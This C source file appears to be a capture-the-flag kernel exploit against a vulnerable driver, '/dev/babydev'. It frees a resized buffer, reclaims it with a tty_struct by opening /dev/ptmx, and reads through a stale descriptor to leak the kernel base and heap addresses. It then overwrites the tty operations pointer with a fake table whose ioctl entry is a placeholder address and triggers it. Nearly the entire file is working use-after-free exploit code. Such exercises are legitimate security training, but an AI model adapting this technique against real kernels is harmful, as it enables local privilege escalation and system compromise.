#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>

#define CMD_RESIZE 0x10001
#define PAGE 0x1000
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

int _open()
{
    int fd = open("/dev/babydev", O_RDWR);
    if (fd < 0)
        errExit("failed at open babydev");

    return fd;
}

int main()
{
    ulong kbase, kheap;
    int fd1, fd2;
    int ptmx_fd;
    char buf[0x400];

    fd1 = _open(); // 0x40 (buf)
    fd2 = _open(); // 0x40 (buf)

    // TEST
    // char test_buf[0x40];
    // memset(test_buf, 0x41, 0x40);
    // write(fd1, test_buf, 0x40-1);
    // char test_buf2[0x40];
    // memset(test_buf2, 0x42, 0x40);
    // write(fd2, test_buf2, 0x40-1);

    // kmalloc-1024
    ioctl(fd1, CMD_RESIZE, 0x400);
    close(fd1);

    // kUAF (kmalloc-1024 for tty_struct)
    ptmx_fd = open("/dev/ptmx", O_NOCTTY|O_RDWR);
    if (ptmx_fd < 0)
        errExit("failed at open ptmx");

    read(fd2, buf, 0x400-1);

    for (int i = 0; i < 0x400; i +=8)
        printf("[%d] 0x%llx\n", i / 8, *(ulong *)(buf + i));

    printf("\n\n\n");

    kbase = *(ulong *)(buf + 3*sizeof(long)) - 0xa74f80;
    kheap = *(ulong *)(buf + 0x40);

    printf("[+] kbase = 0x%llx\n", kbase);
    printf("[+] kheap = 0x%llx\n", kheap);

    *(ulong *)(buf + 3*sizeof(long)) = kheap + 0x128; // fake ptr ops to our kheap
    *(ulong *)(buf + 0x160 + 0x60) = 0xdeadbeef; // fake ops->ioctl

    write(fd2, buf, 0x400-1);

    ioctl(ptmx_fd, 0xc0debabe, 0xcafebeef);


}